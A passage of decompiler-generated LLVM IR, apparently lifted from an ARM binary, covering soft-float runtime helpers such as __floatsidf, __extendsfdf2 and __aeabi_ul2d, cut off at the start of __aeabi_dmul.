  %v6_14ea4 = sub i32 %v1_14ea0, %v5_14ea4
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_14ea8 = phi i32 [ %v6_14ea4, %.thread6 ], [ %v2_14ea0, %bb45 ]
  %v4_14ea8 = udiv i32 %v1_14ea8, 8
  %v5_14ea8 = sub i32 %v0_14ea8, %v4_14ea8
  %v2_14eac = add i32 %v5_14ea8, -32
  %v4_14eac = sub i32 31, %v5_14ea8
  %v5_14eac = and i32 %v4_14eac, %v5_14ea8
  %v8_14eac = icmp eq i32 %v5_14ea8, 32
  %v6_14eb0 = icmp slt i32 %v5_14ea8, 32
  br i1 %v6_14eb0, label %dec_label_pc_14eb4, label %dec_label_pc_14ed4

dec_label_pc_14eb4:                               ; preds = %bb46
  %v2_14eb4 = add i32 %v5_14ea8, -20
  %v7_14eb8 = icmp sgt i32 %v2_14eac, -12
  br i1 %v7_14eb8, label %dec_label_pc_14ebc, label %dec_label_pc_14ed0

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14eb4
  %v1_14ec0 = sub i32 32, %v5_14ea8
  %v6_14ec4 = shl i32 %v0_14ec8, %v5_14ea8
  store i32 %v6_14ec4, i32* @r0, align 4
  %v6_14ec8 = lshr i32 %v0_14ec8, %v1_14ec0
  store i32 %v6_14ec8, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14eb4
  %v8_14eb4 = icmp eq i32 %v2_14eb4, 0
  %v4_14eb4 = add i32 %v5_14ea8, 2147483616
  %v5_14eb4 = and i32 %v2_14eb4, %v4_14eb4
  br label %dec_label_pc_14ed4

dec_label_pc_14ed4:                               ; preds = %bb46, %dec_label_pc_14ed0
  %v1_14ee0.in = phi i32 [ %v2_14eac, %bb46 ], [ %v2_14eb4, %dec_label_pc_14ed0 ]
  %v6_14ee0 = phi i32 [ %v2_14eac, %bb46 ], [ %v5_14ea8, %dec_label_pc_14ed0 ]
  %v2_14ee0.in = phi i32 [ %v5_14eac, %bb46 ], [ %v5_14eb4, %dec_label_pc_14ed0 ]
  %v0_14ee0 = phi i1 [ %v8_14eac, %bb46 ], [ %v8_14eb4, %dec_label_pc_14ed0 ]
  %v1_14ee0 = icmp slt i32 %v1_14ee0.in, 0
  %v2_14ee0 = icmp slt i32 %v2_14ee0.in, 0
  %v3_14ed4 = xor i1 %v2_14ee0, %v1_14ee0
  %v4_14ed4 = or i1 %v0_14ee0, %v3_14ed4
  br i1 %v4_14ed4, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_14ed4
  %v6_14ed4 = sub i32 32, %v6_14ee0
  store i32 %v6_14ed4, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_14ed4, %bb47
  %v6_14ed8 = shl i32 %v0_14ec8, %v6_14ee0
  store i32 %v6_14ed8, i32* %r1.global-to-local, align 4
  br i1 %v4_14ed4, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_14edc = load i32, i32* @r0, align 4
  %v7_14edc = load i32, i32* @ip, align 4
  %v12_14edc = lshr i32 %v6_14edc, %v7_14edc
  %v13_14edc = or i32 %v12_14edc, %v6_14ed8
  store i32 %v13_14edc, i32* %r1.global-to-local, align 4
  %v11_14ee0 = shl i32 %v6_14edc, %v6_14ee0
  store i32 %v11_14ee0, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_14ebc, %bb49
  %v6_14ee8 = phi i32 [ %v6_14ec8, %dec_label_pc_14ebc ], [ %v13_14edc, %bb49 ], [ %v6_14ed8, %bb48 ]
  %v0_14ee4 = load i32, i32* @r4, align 4
  %v2_14ee4 = sub i32 %v0_14ee4, %v5_14ea8
  store i32 %v2_14ee4, i32* %r4.global-to-local, align 4
  %v4_14ee4 = xor i32 %v0_14ee4, %v5_14ea8
  %v5_14ee4 = xor i32 %v2_14ee4, %v0_14ee4
  %v6_14ee4 = and i32 %v5_14ee4, %v4_14ee4
  %v7_14ee4 = icmp slt i32 %v6_14ee4, 0
  %v8_14ee4 = icmp slt i32 %v2_14ee4, 0
  %v5_14ee8 = icmp slt i32 %v0_14ee4, %v5_14ea8
  br i1 %v5_14ee8, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_14ee8 = mul i32 %v2_14ee4, 1048576
  %v11_14ee8 = add i32 %v10_14ee8, %v6_14ee8
  %v7_14eec = load i32, i32* @r5, align 4
  %v8_14eec = or i32 %v7_14eec, %v11_14ee8
  store i32 %v8_14eec, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_14ef4 = xor i1 %v8_14ee4, %v7_14ee4
  %v4_14ef4 = xor i1 %v3_14ef4, true
  call void @__pseudo_cond_branch(i1 %v4_14ef4, i32 %tmp33)
  %v0_14ef8 = load i32, i32* %r4.global-to-local, align 4
  %v2_14efc = sub i32 -32, %v0_14ef8
  store i32 %v2_14efc, i32* %r4.global-to-local, align 4
  %v6_14f00 = icmp sgt i32 %v0_14ef8, -32
  br i1 %v6_14f00, label %dec_label_pc_14f04, label %dec_label_pc_14f44

dec_label_pc_14f04:                               ; preds = %.thread8
  %v1_14f04 = add i32 %v2_14efc, 12
  store i32 %v1_14f04, i32* %r4.global-to-local, align 4
  %v8_14f08 = icmp sgt i32 %v1_14f04, 0
  br i1 %v8_14f08, label %dec_label_pc_14f28, label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14f04
  %v1_14f0c = add i32 %v2_14efc, 32
  %v1_14f10 = sub i32 0, %v2_14efc
  %v0_14f14 = load i32, i32* @r0, align 4
  %v6_14f14 = lshr i32 %v0_14f14, %v1_14f0c
  %v1_14f18 = load i32, i32* %r1.global-to-local, align 4
  %v7_14f18 = shl i32 %v1_14f18, %v1_14f10
  %v8_14f18 = or i32 %v7_14f18, %v6_14f14
  %v0_14f1c = load i32, i32* @r5, align 4
  %v7_14f1c = lshr i32 %v1_14f18, %v1_14f0c
  %v8_14f1c = or i32 %v0_14f1c, %v7_14f1c
  store i32 %v8_14f1c, i32* %r1.global-to-local, align 4
  %v2_14f20 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_14f20, i32* %r4.global-to-local, align 4
  ret i32 %v8_14f18

dec_label_pc_14f28:                               ; preds = %dec_label_pc_14f04
  %v1_14f28 = sub i32 0, %v2_14efc
  %v1_14f2c = add i32 %v2_14efc, 32
  %v0_14f30 = load i32, i32* @r0, align 4
  %v6_14f30 = lshr i32 %v0_14f30, %v1_14f2c
  %v1_14f34 = load i32, i32* %r1.global-to-local, align 4
  %v7_14f34 = shl i32 %v1_14f34, %v1_14f28
  %v8_14f34 = or i32 %v7_14f34, %v6_14f30
  %v0_14f38 = load i32, i32* @r5, align 4
  store i32 %v0_14f38, i32* %r1.global-to-local, align 4
  %v2_14f3c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_14f3c, i32* %r4.global-to-local, align 4
  ret i32 %v8_14f34

dec_label_pc_14f44:                               ; preds = %.thread8
  %v0_14f44 = load i32, i32* %r1.global-to-local, align 4
  %v6_14f44 = lshr i32 %v0_14f44, %v2_14efc
  %v0_14f48 = load i32, i32* @r5, align 4
  store i32 %v0_14f48, i32* %r1.global-to-local, align 4
  %v2_14f4c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_14f4c, i32* %r4.global-to-local, align 4
  ret i32 %v6_14f44

; uselistorder directives
  uselistorder i32 %v2_14efc, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_14ee4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14ee4, { 2, 0, 1, 3 }
  uselistorder i32 %v6_14ed8, { 1, 0, 2 }
  uselistorder i32 %v2_14eac, { 1, 0, 2 }
  uselistorder i32 %v5_14ea8, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_14e94, { 1, 0 }
  uselistorder i32 %v1_14e94, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14e88, { 1, 0 }
  uselistorder i32 %v1_14e88, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14e7c, { 1, 0 }
  uselistorder i32 %v0_14ec8, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 7, 3, 8, 4, 9, 5, 0, 1, 2, 6, 10 }
  uselistorder i32 -12, { 2, 27, 28, 0, 1, 3, 15, 16, 4, 18, 19, 5, 20, 21, 17, 14, 13, 12, 11, 10, 22, 23, 24, 25, 9, 6, 8, 7, 26 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 8, 1, 2, 7, 10, 9, 18, 11, 12, 19, 4, 5, 3, 13, 14, 15, 0, 6, 16, 20, 21, 22, 23, 17 }
  uselistorder i32 -4, { 10, 11, 47, 12, 48, 49, 50, 2, 13, 56, 57, 58, 59, 60, 61, 0, 1, 55, 21, 75, 76, 77, 6, 22, 23, 24, 78, 79, 80, 7, 25, 26, 27, 81, 82, 83, 8, 28, 29, 84, 20, 19, 85, 86, 87, 18, 17, 16, 15, 30, 31, 32, 33, 34, 5, 35, 3, 36, 4, 88, 14, 37, 51, 52, 53, 54, 38, 39, 63, 64, 65, 9, 66, 67, 68, 40, 62, 69, 70, 71, 72, 73, 74, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 15, { 5, 6, 7, 0, 3, 12, 1, 13, 8, 9, 10, 2, 14, 11, 4 }
  uselistorder i32 -8, { 4, 33, 34, 5, 0, 35, 6, 7, 8, 36, 15, 16, 17, 18, 19, 20, 14, 13, 3, 12, 11, 10, 9, 21, 22, 23, 24, 25, 2, 37, 26, 27, 38, 28, 39, 32, 29, 30, 31, 1 }
  uselistorder i32 128, { 13, 14, 0, 8, 9, 10, 17, 18, 1, 2, 11, 19, 5, 16, 6, 7, 12, 22, 21, 3, 4, 20, 15 }
  uselistorder i32 255, { 7, 8, 4, 11, 12, 3, 5, 6, 10, 0, 1, 2, 9 }
  uselistorder i32 -16, { 2, 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 7, 6, 5, 1, 17, 18, 19, 20, 21, 22, 4, 0 }
  uselistorder i32 65536, { 1, 2, 3, 4, 6, 5, 7, 8, 0, 9, 10, 12, 11, 17, 13, 18, 14, 19, 15, 20, 16, 21, 22, 23, 27, 24, 28, 25, 29, 26, 30, 40, 31, 41, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 32768, { 3, 4, 1, 6, 2, 0, 5 }
  uselistorder i32 65535, { 2, 3, 0, 1, 4 }
  uselistorder i32 52, { 1, 12, 3, 18, 13, 14, 4, 5, 7, 6, 8, 20, 16, 15, 21, 9, 19, 17, 22, 23, 2, 24, 0, 25, 26, 10, 11 }
  uselistorder i32 20, { 5, 0, 13, 14, 15, 32, 33, 6, 16, 17, 18, 19, 2, 8, 38, 34, 35, 20, 21, 22, 23, 36, 37, 31, 41, 9, 42, 43, 3, 44, 39, 10, 24, 40, 28, 29, 30, 25, 11, 26, 27, 1, 45, 7, 12, 46, 4 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_14ed4, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14f54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_14f54:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_14f54 = load i32, i32* @r4, align 4
  %v2_14f54 = icmp eq i32 %v0_14f54, 0
  %v1_14f58 = xor i32 %arg3, 1048576
  store i32 %v1_14f58, i32* @r3, align 4
  br i1 %v2_14f54, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_14f54
  %v1_14f5c = load i32, i32* @r1, align 4
  %v2_14f5c = xor i32 %v1_14f5c, 1048576
  store i32 %v2_14f5c, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_14f54
  %v1_14f64 = load i32, i32* @r5, align 4
  %v2_14f64 = add i32 %v1_14f64, -1
  store i32 %v2_14f64, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_14f68 = call i32 @function_14dac()
  store i32 %v0_14f68, i32* %r0.global-to-local, align 4
  %v0_14f6c = load i32, i32* @r4, align 4
  %v0_14f6c.off = add i32 %v0_14f6c, 4194303
  %tmp = icmp ult i32 %v0_14f6c.off, 2097152
  %v1_14ffc = load i32, i32* @r5, align 4
  %v1_14ffc.off = add i32 %v1_14ffc, 4194303
  %tmp44 = icmp ult i32 %v1_14ffc.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %bb30
  %v4_14f78 = icmp eq i32 %v1_14ffc, %v0_14f6c
  br i1 %v4_14f78, label %bb31, label %dec_label_pc_14f84

bb31:                                             ; preds = %dec_label_pc_14f78
  %v2_14f7c = load i32, i32* @r2, align 4
  %v5_14f7c = icmp eq i32 %v2_14f7c, %v0_14f68
  br i1 %v5_14f7c, label %dec_label_pc_14f98, label %dec_label_pc_14f84

dec_label_pc_14f84:                               ; preds = %dec_label_pc_14f78, %bb31
  %v2_14f84 = or i32 %v0_14f6c, %v0_14f68
  %v4_14f84 = icmp eq i32 %v2_14f84, 0
  br i1 %v4_14f84, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_14f84
  %v1_14f8c = load i32, i32* @r2, align 4
  store i32 %v1_14f8c, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14f84, %bb32
  %v1_14f94 = phi i32 [ %v0_14f68, %dec_label_pc_14f84 ], [ %v1_14f8c, %bb32 ]
  ret i32 %v1_14f94

dec_label_pc_14f98:                               ; preds = %bb31
  %v0_14f98 = load i32, i32* @r1, align 4
  %v1_14f98 = load i32, i32* @r3, align 4
  %v4_14f98 = icmp eq i32 %v1_14f98, %v0_14f98
  br i1 %v4_14f98, label %dec_label_pc_14f98..thread8_crit_edge, label %bb33

dec_label_pc_14f98..thread8_crit_edge:            ; preds = %dec_label_pc_14f98
  %v0_14fa8.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_14f98
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14f98..thread8_crit_edge, %bb33
  %v0_14fa8 = phi i32 [ %v0_14fa8.pre, %dec_label_pc_14f98..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_14fa8 = xor i1 %v4_14f98, true
  call void @__pseudo_cond_branch(i1 %v2_14fa8, i32 %v0_14fa8)
  %v0_14fac = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_14fac, 2097152
  br i1 %tmp45, label %dec_label_pc_14fb4, label %dec_label_pc_14fc8

dec_label_pc_14fb4:                               ; preds = %.thread8
  %v0_14fb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_14fb4 = icmp slt i32 %v0_14fb4, 0
  %v2_14fb4 = mul i32 %v0_14fb4, 2
  store i32 %v2_14fb4, i32* %r0.global-to-local, align 4
  %v0_14fb8 = load i32, i32* @r1, align 4
  %v3_14fb8 = mul i32 %v0_14fb8, 2
  %v4_14fb8 = zext i1 %v1_14fb4 to i32
  %v5_14fb8 = or i32 %v3_14fb8, %v4_14fb8
  %v9_14fb8 = icmp ule i32 %v5_14fb8, %v0_14fb8
  %v10_14fb8 = icmp ult i32 %v3_14fb8, %v0_14fb8
  %v11_14fb8 = select i1 %v1_14fb4, i1 %v9_14fb8, i1 %v10_14fb8
  br i1 %v11_14fb8, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_14fb4
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_14fb4, %bb34
  ret i32 %v2_14fb4

dec_label_pc_14fc8:                               ; preds = %.thread8
  %v2_14fc8 = icmp ugt i32 %v0_14fac, -4194305
  br i1 %v2_14fc8, label %dec_label_pc_14fc8..thread9_crit_edge, label %bb36

dec_label_pc_14fc8..thread9_crit_edge:            ; preds = %dec_label_pc_14fc8
  %v0_14fd4.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_14fc8
  %v1_14fcc = load i32, i32* @r1, align 4
  %v2_14fcc = add i32 %v1_14fcc, 1048576
  store i32 %v2_14fcc, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_14fc8..thread9_crit_edge, %bb36
  %v0_14fd4 = phi i32 [ %v0_14fd4.pre, %dec_label_pc_14fc8..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_14fd4 = xor i1 %v2_14fc8, true
  call void @__pseudo_cond_branch(i1 %v2_14fd4, i32 %v0_14fd4)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_15008.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_15008.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_14ff4 = load i32, i32* @r3, align 4
  %v1_14ff8 = load i32, i32* @r2, align 4
  store i32 %v1_14ff8, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1500823 = phi i32 [ %v1_15008.pre, %.thread14 ], [ %v1_14ff4, %bb37 ]
  %v1_15004 = phi i32 [ %v0_14f68, %.thread14 ], [ %v1_14ff8, %bb37 ]
  store i32 %v1_15004, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_15014 = phi i32 [ %v1_1500823, %bb38 ], [ %v1_15008.pre, %.thread11 ]
  %v1_1501c = phi i32 [ %v1_15004, %bb38 ], [ %v0_14f68, %.thread11 ]
  %v4_15008 = mul i32 %v1_15014, 4096
  %v5_15008 = or i32 %v4_15008, %v1_1501c
  %v7_15008 = icmp eq i32 %v5_15008, 0
  br i1 %v7_15008, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1500c = load i32, i32* @r2, align 4
  %v2_1500c = load i32, i32* @r3, align 4
  %v5_1500c = mul i32 %v2_1500c, 4096
  %v6_1500c = or i32 %v5_1500c, %v1_1500c
  %v8_1500c = icmp eq i32 %v6_1500c, 0
  br i1 %v8_1500c, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_15010 = icmp eq i32 %v2_1500c, %v1_15014
  br i1 %v5_15010, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1501c

; uselistorder directives
  uselistorder i32 %v1_15008.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14fb8, { 1, 2, 0 }
  uselistorder i32 %v2_14fb4, { 1, 0 }
  uselistorder i1 %v1_14fb4, { 1, 0 }
  uselistorder i32 %v0_14fac, { 1, 0 }
  uselistorder i1 %v4_14f98, { 1, 0 }
  uselistorder i32 %v0_14f6c, { 2, 0, 1 }
  uselistorder i32 %v0_14f68, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_14f84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_15020 = icmp eq i32 %arg1, 0
  br i1 %v2_15020, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_15028 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15020, i32 %v0_15028)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_15040 = call i32 @function_14e60()
  ret i32 %v0_15040

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_15044 = icmp eq i32 %arg1, 0
  br i1 %v2_15044, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1504c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15044, i32 %v0_1504c)
  store i32 1074, i32* @r4, align 4
  %v1_1505c = and i32 %arg1, -2147483648
  store i32 %v1_1505c, i32* @r5, align 4
  %v2_1505c = icmp eq i32 %v1_1505c, 0
  br i1 %v2_1505c, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_15060 = sub i32 0, %arg1
  store i32 %v2_15060, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_15068 = call i32 @function_14e60()
  ret i32 %v0_15068

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1506c = mul i32 %arg1, 2
  store i32 %v2_1506c, i32* %r2.global-to-local, align 4
  %v4_1506c = icmp eq i32 %v2_1506c, 0
  %v1_15070 = and i32 %v2_1506c, 4
  %v2_15070 = icmp ne i32 %v1_15070, 0
  %v3_15070 = sdiv i32 %v2_1506c, 8
  %v3_15074 = zext i1 %v2_15070 to i32
  %v6_15074 = zext i32 %v3_15070 to i64
  %v7_15074 = sub nsw i32 33, %v3_15070
  %v8_15074 = zext i32 %v7_15074 to i64
  %v9_15074 = shl i64 %v6_15074, %v8_15074
  %v10_15074 = sub nsw i32 32, %v3_15070
  %v11_15074 = shl i32 %v3_15074, %v10_15074
  %v12_15074 = zext i32 %v11_15074 to i64
  %v14_15074 = or i64 %v12_15074, %v9_15074
  %v15_15074 = trunc i64 %v14_15074 to i32
  store i32 %v15_15074, i32* %r1.global-to-local, align 4
  %v3_15078 = mul i32 %arg1, 536870912
  store i32 %v3_15078, i32* @r0, align 4
  br i1 %v4_1506c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1507c = and i32 %v2_1506c, -16777216
  store i32 %v2_1507c, i32* @r3, align 4
  %v4_1507c = icmp eq i32 %v2_1507c, 0
  br i1 %v4_1507c, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_15080 = icmp ugt i32 %v2_1506c, -16777217
  br i1 %v4_15080, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_15084 = xor i32 %v15_15074, 939524096
  store i32 %v2_15084, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_15088 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_15088 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_15088, i32 %v0_15088)
  %v0_1508c = load i32, i32* %r2.global-to-local, align 4
  %v2_1508c = icmp eq i32 %v0_1508c, 0
  br i1 %v2_1508c, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_15090 = load i32, i32* @r3, align 4
  %v4_15090 = icmp eq i32 %v1_15090, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_15094 = phi i1 [ true, %.thread1 ], [ %v4_15090, %bb9 ]
  %v0_15094 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_15094, i32 %v0_15094)
  store i32 896, i32* @r4, align 4
  %v0_150a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_150a0 = and i32 %v0_150a0, -2147483648
  store i32 %v1_150a0, i32* @r5, align 4
  %tmp = bitcast i32 %v0_150a0 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_150a4 = bitcast float %tmp11 to i32
  store i32 %v1_150a4, i32* @r1, align 4
  %v0_150a8 = call i32 @function_14e60()
  ret i32 %v0_150a8

; uselistorder directives
  uselistorder i32 %v3_15070, { 1, 2, 0 }
  uselistorder i32 %v2_1506c, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_14e60, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_150ac = or i32 %arg2, %arg1
  %v4_150ac = icmp eq i32 %v2_150ac, 0
  %v0_150b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_150ac, i32 %v0_150b0)
  store i32 0, i32* @r5, align 4
  %v0_150bc = call i32 @function_150dc()
  ret i32 %v0_150bc
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_150c0 = or i32 %arg2, %arg1
  %v4_150c0 = icmp eq i32 %v2_150c0, 0
  %v0_150c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_150c0, i32 %v0_150c4)
  %v1_150d0 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_150d0, i32 ptrtoint (i32* @global_var_150dc.446 to i32))
  %v1_150d4 = sub i32 0, %arg1
  ret i32 %v1_150d4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_150dc() local_unnamed_addr {
dec_label_pc_150dc:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_150e4 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_150e4, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_14e00.444 to i32))
  %tmp6 = icmp ult i32 %v0_150e4, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_150dc
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_150dc, %bb
  %v1_150fc = phi i32 [ 3, %dec_label_pc_150dc ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_150e4, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_150fc = add nuw nsw i32 %v1_150fc, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_15100 = phi i32 [ %v1_150fc, %bb3 ], [ %v2_150fc, %bb4 ]
  %not. = icmp slt i32 %v0_150e4, 0
  %v4_15100 = zext i1 %not. to i32
  %v5_15100 = add nsw i32 %v0_15100, %v4_15100
  %v1_15104 = sub nsw i32 32, %v5_15100
  %v0_15108 = load i32, i32* @r0, align 4
  %v6_15108 = shl i32 %v0_15108, %v1_15104
  store i32 %v6_15108, i32* @ip, align 4
  %v6_1510c = lshr i32 %v0_15108, %v5_15100
  %v1_15110 = load i32, i32* @r1, align 4
  %v7_15110 = shl i32 %v1_15110, %v1_15104
  %v8_15110 = or i32 %v7_15110, %v6_1510c
  %v6_15114 = lshr i32 %v1_15110, %v5_15100
  %v0_15118 = load i32, i32* %r4.global-to-local, align 4
  %v2_15118 = add i32 %v0_15118, %v5_15100
  store i32 %v2_15118, i32* @r4, align 4
  %v4_1511c = sext i32 %v8_15110 to i64
  %v5_1511c = call i32 @function_14e00(i64 %v4_1511c, i32 %v6_15114, i32 %v5_15100, i32 %v1_15104)
  ret i32 %v5_1511c

; uselistorder directives
  uselistorder i32 %v5_15100, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 8, 9, 13, 14, 2, 0, 5, 10, 1, 3, 11, 12, 15, 16, 6, 7, 17 }
  uselistorder i32 3, { 36, 12, 23, 44, 24, 37, 0, 1, 2, 38, 3, 4, 39, 6, 19, 40, 45, 46, 47, 8, 41, 5, 15, 49, 9, 50, 16, 51, 52, 13, 53, 10, 43, 25, 26, 58, 27, 28, 29, 30, 31, 32, 48, 20, 35, 7, 42, 33, 59, 14, 54, 18, 55, 17, 56, 11, 57, 34, 21, 22 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
